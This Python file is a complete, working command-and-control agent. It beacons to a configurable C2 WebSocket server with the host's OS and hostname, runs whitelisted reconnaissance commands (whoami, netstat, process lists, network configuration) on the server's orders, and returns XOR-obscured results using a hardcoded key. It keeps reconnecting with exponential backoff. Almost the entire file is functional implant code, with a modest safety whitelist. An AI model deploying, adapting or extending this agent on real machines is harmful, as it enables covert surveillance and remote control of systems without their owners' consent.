import asyncio
import websockets
import json
import uuid
import sys
import platform
import subprocess
import time
from typing import Optional, Dict, Any
import os

# ===========================================
# ENHANCED AGENT WITH RESILIENCE & ENCRYPTION
# ===========================================

# Pre-shared key for symmetric encryption (example)
PSK = os.getenv("AGENT_PSK", "aligo-shared-secret-2024-v1")
MAX_BACKOFF = 64  # Maximum backoff in seconds
INITIAL_BACKOFF = 2

class CommandExecutor:
    """Safely execute commands and return real host data."""
    
    SAFE_COMMANDS = {
        "whoami": "whoami",
        "ipconfig": "ipconfig" if platform.system() == "Windows" else "ifconfig",
        "netstat": "netstat -ano" if platform.system() == "Windows" else "netstat -tuln",
        "hostname": "hostname",
        "uname": "uname -a" if platform.system() != "Windows" else "systeminfo",
        "ps": "tasklist" if platform.system() == "Windows" else "ps aux",
    }
    
    @staticmethod
    def execute(command: str) -> str:
        """Execute a safe command and return output."""
        try:
            # Validate command against whitelist
            cmd_key = command.lower().strip()
            if cmd_key not in CommandExecutor.SAFE_COMMANDS:
                return f"[ERROR] Command '{command}' not in whitelist. Allowed: {list(CommandExecutor.SAFE_COMMANDS.keys())}"
            
            safe_cmd = CommandExecutor.SAFE_COMMANDS[cmd_key]
            result = subprocess.run(
                safe_cmd,
                shell=True,
                capture_output=True,
                text=True,
                timeout=10
            )
            
            output = result.stdout if result.returncode == 0 else result.stderr
            return output.strip() if output else "[No output]"
        except subprocess.TimeoutExpired:
            return "[ERROR] Command execution timeout"
        except Exception as e:
            return f"[ERROR] {str(e)}"

class EncryptionManager:
    """Handle symmetric encryption/decryption of payloads."""
    
    @staticmethod
    def xor_cipher(data: str, key: str) -> str:
        """Simple XOR cipher (fallback if no cryptography module)."""
        result = []
        key_len = len(key)
        for i, char in enumerate(data):
            xor_char = ord(char) ^ ord(key[i % key_len])
            result.append(format(xor_char, '02x'))
        return ''.join(result)
    
    @staticmethod
    def xor_decipher(hex_data: str, key: str) -> str:
        """Decrypt XOR cipher."""
        result = []
        key_len = len(key)
        for i in range(0, len(hex_data), 2):
            xor_val = int(hex_data[i:i+2], 16)
            result.append(chr(xor_val ^ ord(key[(i//2) % key_len])))
        return ''.join(result)
    
    @staticmethod
    def encrypt_payload(data: Dict[str, Any], psk: str) -> Dict[str, Any]:
        """Encrypt command data with PSK."""
        json_str = json.dumps(data)
        encrypted = EncryptionManager.xor_cipher(json_str, psk)
        return {"_encrypted": encrypted, "_v": 1}
    
    @staticmethod
    def decrypt_payload(data: Dict[str, Any], psk: str) -> Optional[Dict[str, Any]]:
        """Decrypt payload with PSK."""
        try:
            if data.get("_v") == 1 and "_encrypted" in data:
                decrypted = EncryptionManager.xor_decipher(data["_encrypted"], psk)
                return json.loads(decrypted)
        except Exception as e:
            print(f"[!] Decryption error: {e}")
        return None

class ResilientAgent:
    """WebSocket agent with exponential backoff reconnection."""
    
    def __init__(self, agent_id: str, c2_uri: str, psk: str):
        self.agent_id = agent_id
        self.c2_uri = c2_uri
        self.psk = psk
        self.backoff = INITIAL_BACKOFF
        self.is_running = True
    
    async def connect_with_backoff(self):
        """Connect to C2 with exponential backoff on failures."""
        while self.is_running:
            try:
                print(f"[*] Attempting connection to {self.c2_uri} (backoff: {self.backoff}s)")
                async with websockets.connect(self.c2_uri, close_timeout=5) as websocket:
                    print(f"[+] Connected to C2 server. Resetting backoff.")
                    self.backoff = INITIAL_BACKOFF  # Reset on successful connection
                    await self.handle_connection(websocket)
            except asyncio.TimeoutError:
                print(f"[-] Connection timeout. Retrying in {self.backoff}s...")
                await asyncio.sleep(self.backoff)
                self.backoff = min(self.backoff * 2, MAX_BACKOFF)
            except websockets.exceptions.ConnectionClosed:
                print(f"[-] Connection closed. Retrying in {self.backoff}s...")
                await asyncio.sleep(self.backoff)
                self.backoff = min(self.backoff * 2, MAX_BACKOFF)
            except OSError as e:
                print(f"[-] Connection error: {e}. Retrying in {self.backoff}s...")
                await asyncio.sleep(self.backoff)
                self.backoff = min(self.backoff * 2, MAX_BACKOFF)
            except Exception as e:
                print(f"[-] Unexpected error: {e}. Retrying in {self.backoff}s...")
                await asyncio.sleep(self.backoff)
                self.backoff = min(self.backoff * 2, MAX_BACKOFF)
    
    async def handle_connection(self, websocket):
        """Handle active WebSocket connection."""
        try:
            # Send initial beacon
            beacon = {
                "type": "beacon",
                "agent_id": self.agent_id,
                "os": platform.system(),
                "hostname": platform.node()
            }
            await websocket.send(json.dumps(beacon))
            print(f"[+] Beacon sent")
            
            # Listen for commands
            while self.is_running:
                try:
                    message = await asyncio.wait_for(websocket.recv(), timeout=60)
                    await self.process_message(message, websocket)
                except asyncio.TimeoutError:
                    # Keep-alive timeout, continue listening
                    pass
        except Exception as e:
            print(f"[-] Error in connection handler: {e}")
    
    async def process_message(self, message: str, websocket):
        """Process incoming command message."""
        try:
            data = json.loads(message)
            print(f"[!] Received message: {data.get('type', 'unknown')}")
            
            # Attempt decryption
            if "_encrypted" in data:
                decrypted = EncryptionManager.decrypt_payload(data, self.psk)
                if decrypted:
                    data = decrypted
            
            if data.get("type") == "command":
                cmd = data.get("data", "")
                print(f"[!] Executing command: {cmd}")
                
                # Execute real command
                result = CommandExecutor.execute(cmd)
                print(f"[+] Command result:\n{result}")
                
                # Send result back
                result_payload = {
                    "agent_id": self.agent_id,
                    "command": cmd,
                    "result": result,
                    "timestamp": time.time()
                }
                
                # Optionally encrypt result
                if self.psk:
                    result_payload = EncryptionManager.encrypt_payload(result_payload, self.psk)
                
                await websocket.send(json.dumps(result_payload))
                print(f"[+] Result sent back to C2")
        except Exception as e:
            print(f"[-] Error processing message: {e}")

async def agent():
    agent_id = f"{uuid.uuid4().hex[:8]}-{platform.system().lower()}"
    os_name = platform.system()
    c2_uri = os.getenv("C2_URI", f"ws://localhost:8000/ws/{agent_id}")
    psk = os.getenv("AGENT_PSK", PSK)
    
    print(f"[*] Starting Enhanced Agent {agent_id}")
    print(f"[*] OS: {os_name}")
    print(f"[*] C2 URI: {c2_uri}")
    print(f"[*] PSK-based encryption: {'Enabled' if psk else 'Disabled'}")
    
    agent = ResilientAgent(agent_id, c2_uri, psk)
    await agent.connect_with_backoff()

if __name__ == "__main__":
    try:
        asyncio.run(agent())
    except KeyboardInterrupt:
        print("\n[*] Agent shutting down...")
        sys.exit(0)
